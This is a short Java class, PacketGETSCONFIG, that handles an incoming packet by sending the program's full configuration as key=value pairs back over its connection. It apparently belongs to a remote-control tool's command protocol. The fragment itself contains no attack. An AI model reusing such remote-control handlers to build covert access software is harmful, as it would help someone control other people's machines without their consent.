package com.redpois0n.packets.incoming;

import com.redpois0n.Connection;
import com.redpois0n.Main;
import com.redpois0n.packets.outgoing.Header;

public class PacketGETSCONFIG extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		PacketBuilder packet = new PacketBuilder(Header.CONFIG);

		packet.add(Main.config.size());
		
		for (String key : Main.config.keySet()) {
			packet.add(key + "=" + Main.config.get(key));
		}
		
		Connection.addToSendQueue(packet);
	}

}
